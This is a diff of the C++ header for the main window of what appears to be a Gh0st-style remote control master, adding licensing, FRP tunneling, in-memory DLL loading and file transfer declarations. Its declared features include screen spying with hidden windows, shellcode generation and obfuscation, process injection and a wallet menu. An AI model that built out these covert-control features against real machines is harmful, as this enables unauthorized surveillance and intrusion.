@@ -7,9 +7,14 @@
 #include "IOCPServer.h"
 #include <common/location.h>
 #include <map>
-#include "file_server.h"
+#include <unordered_map>
+#include <mutex>
+#include <vector>
+#include <string>
+#include "WebService.h"
 #include "CListCtrlEx.h"
 #include "LangManager.h"
+#include "client/MemoryModule.h"
 
 //////////////////////////////////////////////////////////////////////////
 // 以下为特殊需求使用
@@ -19,6 +24,9 @@
 
 // 是否使用同步事件处理消息
 #define USING_EVENT 1
+
+#include "UIBranding.h"
+#define VERSION_STR BRAND_VERSION
 
 typedef struct DllInfo {
     std::string Name;
@@ -62,8 +70,39 @@ enum {
 
 class CSplashDlg;  // 前向声明
 class CClientListDlg;
+class CLicenseDlg;
+class CSearchBarDlg;
 
 #include "pwd_gen.h"
+
+std::string GetDbPath();
+
+typedef void (*contextModifier)(context* ctx, void* user);
+
+bool IsDateGreaterOrEqual(const char* date1, const char* date2);
+
+// V2 文件传输协议分界日期（>= 此日期的客户端支持 V2）
+#define FILE_TRANSFER_V2_DATE "Feb 27 2026"
+
+// 前向声明
+class CMy2015RemoteDlg;
+extern CMy2015RemoteDlg* g_2015RemoteDlg;
+
+// 检查客户端是否支持 V2 文件传输协议
+// 返回 true 需同时满足：1) 全局开关开启 2) 客户端支持 V2
+// 注意：m_bEnableFileV2 是 CMy2015RemoteDlg 的成员变量
+bool SupportsFileTransferV2(context* ctx);
+
+// 服务端待续传的传输信息
+struct PendingTransferV2 {
+    uint64_t clientID;
+    std::vector<std::string> files;
+    DWORD startTime;
+};
+
+// 服务端待续传传输状态（transferID → 传输信息）
+extern std::map<uint64_t, PendingTransferV2> g_pendingTransfersV2;
+extern std::mutex g_pendingTransfersV2Mtx;
 
 // CMy2015RemoteDlg 对话框
 class CMy2015RemoteDlg : public CDialogLangEx
@@ -72,6 +111,9 @@ public:
     static std::string GetHardwareID(int v=-1);
     _ClientList *m_ClientMap = nullptr;
     CClientListDlg* m_pClientListDlg = nullptr;
+    CLicenseDlg* m_pLicenseDlg = nullptr;
+    CSearchBarDlg* m_pSearchBar = nullptr;  // 搜索工具栏
+    BOOL m_bEnableFileV2 = FALSE;  // V2 文件传输开关
 
     // 构造
 public:
@@ -90,8 +132,8 @@ protected:
     DWORD g_StartTick;
     BOOL m_bHookWIN = TRUE;
     BOOL m_runNormal = FALSE;
-    FileDownloadServer* m_FileServer = nullptr;
     // 生成的消息映射函数
+    std::string m_localPublicIP, m_localPrivateIP;
     virtual BOOL OnInitDialog();
     afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
     afx_msg void OnPaint();
@@ -108,6 +150,8 @@ public:
         BOOL isGrid = id == IDD_DIALOG_SCREEN_SPY;
         BOOL ok = (isGrid&&m_gridDlg) ? m_gridDlg->HasSlot() : FALSE;
         Dlg->Create(id, ok ? m_gridDlg : GetDesktopWindow());
+
+        // Check if this is a web-triggered ScreenSpyDlg session - hide window if so
         Dlg->ShowWindow(Show);
         if (ok) {
             m_gridDlg->AddChild((CDialog*)Dlg);
@@ -120,6 +164,7 @@ public:
         }
 
         ContextObject->hDlg = Dlg;
+        ContextObject->hWnd = Dlg->GetSafeHwnd();
         if (id == IDD_DIALOG_SCREEN_SPY) {
             EnterCriticalSection(&m_cs);
             m_RemoteWnds[Dlg->GetSafeHwnd()] = (CDialogBase*)Dlg;
@@ -130,6 +175,8 @@ public:
     }
     VOID InitControl();             //初始控件
     VOID TestOnline();              //测试函数
+    BOOL m_HasLocDB = FALSE;
+    IPConverter* m_IPConverter = nullptr;
     VOID AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing,
                  CString ver, CString startTime, std::vector<std::string>& v, CONTEXT_OBJECT* ContextObject);
     VOID ShowMessage(CString strType, CString strMsg);
@@ -137,34 +184,70 @@ public:
     VOID CreateToolBar();
     VOID CreateNotifyBar();
     VOID CreateSolidMenu();
+    // 通过菜单项ID查找子菜单（避免硬编码索引）
+    CMenu* FindSubMenuByCommand(CMenu* pParent, UINT commandId);
     int m_nMaxConnection;
     BOOL Activate(const std::string& nPort, int nMaxConnection, const std::string& method);
     void UpdateActiveWindow(CONTEXT_OBJECT* ctx);
-    void SendMasterSettings(CONTEXT_OBJECT* ctx);
+    void SendPendingRenewal(CONTEXT_OBJECT* ctx, const std::string& sn, const std::string& passcode, const char* source = nullptr);
+    std::string BuildAuthorizationResponse(const std::string& sn, const std::string& passcode, const std::string& pwdHash, bool isV2Auth);
+    // 生成续期信息，返回: (newPasscode, newHmac)，如果不需要续期则返回空字符串
+    std::pair<std::string, std::string> GenerateRenewalInfo(const std::string& sn, const std::string& passcode,
+        const std::string& pwdHash, bool isV2);
+    // 统一的授权验证函数，返回: (authorized, isV2, isTrail, expired)
+    // expired=true 表示签名有效但已过期（可用于续期）
+    // source: 验证来源 ("AUTH"=TOKEN_AUTH, "HB"=心跳)
+    std::tuple<bool, bool, bool, bool> VerifyClientAuth(context* host, const std::string& sn,
+        const std::string& passcode, uint64_t hmac, const std::string& hmacV2, const std::string& ip,
+        const char* source = "AUTH");
+    void SendMasterSettings(CONTEXT_OBJECT* ctx, const MasterSettings& m);
+    void SendFilesToClientV2(context* mainCtx, const std::vector<std::string>& files, const std::string& targetDir = "");
+    void SendFilesToClientV2Internal(context* mainCtx, const std::vector<std::string>& files,
+        uint64_t resumeTransferID, const std::map<uint32_t, uint64_t>& startOffsets, const std::string& targetDir = "");
+    void HandleFileResumeRequest(CONTEXT_OBJECT* ctx, const BYTE* data, size_t len);
     BOOL SendServerDll(CONTEXT_OBJECT* ContextObject, bool isDLL, bool is64Bit);
     Buffer* m_ServerDLL[PAYLOAD_MAXTYPE];
     Buffer* m_ServerBin[PAYLOAD_MAXTYPE];
+    Buffer* m_TinyRun[PAYLOAD_MAXTYPE] = {};
     MasterSettings m_settings;
     static BOOL CALLBACK NotifyProc(CONTEXT_OBJECT* ContextObject);
     static BOOL CALLBACK OfflineProc(CONTEXT_OBJECT* ContextObject);
-    BOOL AuthorizeClient(const std::string& sn, const std::string& passcode, uint64_t hmac);
+    BOOL AuthorizeClient(context* ctx, const std::string& sn, const std::string& passcode, uint64_t hmac, bool* outExpired = nullptr);
+    BOOL AuthorizeClientV2(context* ctx, const std::string& sn, const std::string& passcode, const std::string& hmacV2, bool* outExpired = nullptr);
     VOID MessageHandle(CONTEXT_OBJECT* ContextObject);
-    VOID SendSelectedCommand(PBYTE  szBuffer, ULONG ulLength);
+    VOID SendSelectedCommand(PBYTE  szBuffer, ULONG ulLength, contextModifier cb = NULL, void* user=NULL);
     VOID SendAllCommand(PBYTE  szBuffer, ULONG ulLength);
     // 显示用户上线信息
     CWnd* m_pFloatingTip = nullptr;
+    // 记录 clientID（心跳更新）
+    std::set<uint64_t> m_DirtyClients;
+    // 待处理的上线/下线事件（批量更新减少闪烁）
+    std::vector<context*> m_PendingOnline;
+    std::vector<int> m_PendingOffline;  // 存储端口号
     CListCtrlEx m_CList_Online;
     CListCtrl   m_CList_Message;
-    std::set<context*> m_HostList;
+    std::vector<context*> m_HostList;              // 虚拟列表数据源（全部客户端）
+    std::unordered_map<uint64_t, size_t> m_ClientIndex;  // clientID -> m_HostList 索引映射
+    std::vector<size_t> m_FilteredIndices;         // 当前分组过滤后的索引列表
     std::set<std::string> m_GroupList;
     std::string m_selectedGroup;
+	std::string m_v2KeyPath;                      // V2 密钥文件路径
+    void RebuildFilteredIndices();                 // 重建过滤索引
+    context* GetContextByListIndex(int iItem);     // 根据列表索引获取 context（考虑分组过滤）
     void LoadListData(const std::string& group);
     void DeletePopupWindow(BOOL bForce = FALSE);
     void CheckHeartbeat();
     context* FindHost(int port);
     context* FindHost(uint64_t id);
+    context* FindHostNoLock(int port);      // caller must hold m_cs lock
+    context* FindHostNoLock(uint64_t id);   // caller must hold m_cs lock
+    bool RemoveFromHostList(context* ctx);  // 从 m_HostList 中移除并更新索引
 
     CStatusBar m_StatusBar;          //状态条
+    ULONGLONG m_ullStartTime = 0;    // 程序启动时间 (GetTickCount64)
+    CString m_strExpireDate;         // 到期日期 (YYYYMMDD)，空表示无授权
+    CString m_strFrpAddr;            // FRP 地址 (IP:Port)，由上级提供
+    void UpdateStatusBarStats();     // 更新状态栏统计信息
     CTrueColorToolBar m_ToolBar;
     CGridDialog * m_gridDlg = NULL;
     std::vector<DllInfo*> m_DllList;
@@ -174,14 +257,21 @@ public:
     HANDLE m_hExit;
     CRITICAL_SECTION m_cs;
     BOOL       isClosed;
+
+    // DLL 请求限流 (每小时最多 4 次)
+    std::map<std::string, std::vector<time_t>> m_DllRequestTimes;  // IP -> 请求时间列表
+    CRITICAL_SECTION m_DllRateLimitLock;
+    bool IsDllRequestLimited(const std::string& ip);
+    void RecordDllRequest(const std::string& ip);
     CMenu	   m_MainMenu;
-    CBitmap m_bmOnline[20];
+    CBitmap m_bmOnline[51];  // 21 original + 4 context menu + 2 tray menu + 23 main menu
     uint64_t m_superID;
     std::map<HWND, CDialogBase *> m_RemoteWnds;
     FileTransformCmd m_CmdList;
     CDialogBase* GetRemoteWindow(HWND hWnd);
     CDialogBase* GetRemoteWindow(CDialogBase* dlg);
     void RemoveRemoteWindow(HWND wnd);
+    void CloseRemoteDesktopByClientID(uint64_t clientID);
     CDialogBase* m_pActiveSession = nullptr; // 当前活动会话窗口指针 / NULL 表示无
     void UpdateActiveRemoteSession(CDialogBase* sess);
     CDialogBase* GetActiveRemoteSession();
@@ -194,21 +284,67 @@ public:
         STATUS_STOP = 1,
         STATUS_EXIT = 2,
     };
-    HANDLE m_hFRPThread = NULL;
-    int m_frpStatus = STATUS_UNKNOWN;
+    // FRP 多实例支持
+    struct FrpInstance {
+        HANDLE hThread = NULL;
+        int status = STATUS_UNKNOWN;
+        std::string serverAddr;
+    };
+    std::vector<FrpInstance> m_frpInstances;
+    HMEMORYMODULE m_hFrpDll = NULL;
+    typedef int (*FrpRunFunc)(char*, int*);
+    FrpRunFunc m_frpRun = nullptr;
     static DWORD WINAPI StartFrpClient(LPVOID param);
     void ApplyFrpSettings();
+    void InitFrpClients();
+    void StopAllFrpClients();
+
+#ifdef _WIN64
+    // 本地 FRPS 服务器 (仅 64 位支持)
+    HMEMORYMODULE m_hFrpsDll = NULL;
+    typedef int (*FrpsRunSimpleWithTokenFunc)(char*, int, char*, char*, int, int*);
+    FrpsRunSimpleWithTokenFunc m_frpsRunSimpleWithToken = nullptr;
+    int m_frpsStatus = STATUS_UNKNOWN;
+    HANDLE m_hFrpsThread = NULL;
+    static DWORD WINAPI StartLocalFrpsServer(LPVOID param);
+    bool InitLocalFrpsServer();  // 返回 true 表示已启动，需等待
+    void StopLocalFrpsServer();
+#endif
+
+    // FRP 自动代理（由上级提供配置）
+    struct FrpAutoConfig {
+        bool enabled = false;
+        std::string serverAddr;      // 上级的 FRPS 地址
+        int serverPort = 7000;       // 上级的 FRPS 端口
+        int remotePort = 0;          // 上级分配的远程端口
+        std::string expireDate;      // YYYYMMDD 格式
+        std::string privilegeKey;    // 32字符(MD5) 或 ENC:xxx(编码的token)
+        bool isEncodedToken = false; // true: privilegeKey 是编码的 token (官方FRP模式)
+    };
+    FrpAutoConfig m_frpAutoConfig;
+    int m_frpAutoStatus = STATUS_UNKNOWN;  // FRP 自动代理状态
+    HANDLE m_hFrpAutoThread = NULL;        // FRP 自动代理线程句柄
+    static FrpAutoConfig ParseFrpAutoConfig(const std::string& config, bool heartbeat=false);
+    // 获取有效的主控地址（优先使用上级FRP配置）
+    // 返回值：是否使用了FRP地址
+    static bool GetEffectiveMasterAddress(std::string& outIP, int& outPort, bool heartbeat=false);
+    void StartFrpcAuto(const FrpAutoConfig& cfg);
+    void StopFrpcAuto();
+    void InitFrpcAuto();  // 启动时自动恢复
     bool CheckValid(int trail = 14);
     BOOL ShouldRemoteControl();
     afx_msg void OnTimer(UINT_PTR nIDEvent);
     afx_msg void OnClose();
     void Release();
     afx_msg void OnSize(UINT nType, int cx, int cy);
+    afx_msg void OnExitSizeMove();
     afx_msg void OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult);
+    afx_msg void OnGetDispInfo(NMHDR* pNMHDR, LRESULT* pResult);  // 虚拟列表数据回调
     afx_msg void OnOnlineMessage();
     afx_msg void OnOnlineDelete();
     afx_msg void OnOnlineUpdate();
     afx_msg void OnAbout();
+    afx_msg void OnToolbarSearch();
     afx_msg void OnIconNotify(WPARAM wParam,LPARAM lParam);
     afx_msg void OnNotifyShow();
     afx_msg void OnNotifyExit();
@@ -231,6 +367,7 @@ public:
     afx_msg LRESULT OnOpenFileManagerDialog(WPARAM wParam,LPARAM lParam);
     afx_msg LRESULT OnOpenTalkDialog(WPARAM wPrarm,LPARAM lParam);
     afx_msg LRESULT OnOpenShellDialog(WPARAM wParam,LPARAM lParam);
+    afx_msg LRESULT OnOpenTerminalDialog(WPARAM wParam, LPARAM lParam);
     afx_msg LRESULT OnOpenSystemDialog(WPARAM wParam,LPARAM lParam);
     afx_msg LRESULT OnOpenAudioDialog(WPARAM wParam,LPARAM lParam);
     afx_msg LRESULT OnOpenRegisterDialog(WPARAM wParam, LPARAM lParam);
@@ -281,14 +418,19 @@ public:
     afx_msg void OnToolGenShellcode();
     afx_msg void OnOnlineAssignTo();
     afx_msg void OnNMCustomdrawMessage(NMHDR* pNMHDR, LRESULT* pResult);
+    afx_msg void OnRClickMessage(NMHDR* pNMHDR, LRESULT* pResult);
+    afx_msg void OnMsglogDelete();
+    afx_msg void OnMsglogClear();
     afx_msg void OnOnlineAddWatch();
     afx_msg void OnNMCustomdrawOnline(NMHDR* pNMHDR, LRESULT* pResult);
     afx_msg void OnOnlineRunAsAdmin();
     afx_msg LRESULT OnShowErrMessage(WPARAM wParam, LPARAM lParam);
     afx_msg void OnMainWallet();
+    afx_msg void OnMainNetwork();
     afx_msg void OnToolRcedit();
     afx_msg void OnOnlineUninstall();
     afx_msg void OnOnlinePrivateScreen();
+    CString m_PrivateScreenWallpaper;  // 隐私屏幕壁纸路径
     CTabCtrl m_GroupTab;
     afx_msg void OnSelchangeGroupTab(NMHDR* pNMHDR, LRESULT* pResult);
     afx_msg void OnObfsShellcode();
@@ -312,6 +454,9 @@ public:
     afx_msg void OnOnlineInjNotepad();
     afx_msg void OnParamLoginNotify();
     afx_msg void OnParamEnableLog();
+    afx_msg void OnParamPrivacyWallpaper();
+    afx_msg void OnParamFileV2();
+    afx_msg void OnParamRunAsUser();
     void ProxyClientTcpPort(bool isStandard);
     afx_msg void OnProxyPort();
     afx_msg void OnHookWin();
@@ -323,4 +468,17 @@ public:
     afx_msg void OnImportData();
     afx_msg void OnProxyPortStd();
     afx_msg void OnChooseLangDir();
+    afx_msg void OnLocationQqwry();
+    afx_msg void OnLocationIp2region();
+    afx_msg void OnToolLicenseMgr();
+    afx_msg void OnToolImportLicense();
+    afx_msg void OnToolV2PrivateKey();
+    afx_msg void OnMenuNotifySettings();
+    afx_msg void OnFrpsForSub();
+    afx_msg void OnOnlineLoginNotify();
+    afx_msg void OnExecuteTestrun();
+    afx_msg void OnExecuteGhost();
+    afx_msg void OnMasterTrail();
+    afx_msg void OnCancelShare();
+    afx_msg void OnWebRemoteControl();
 };
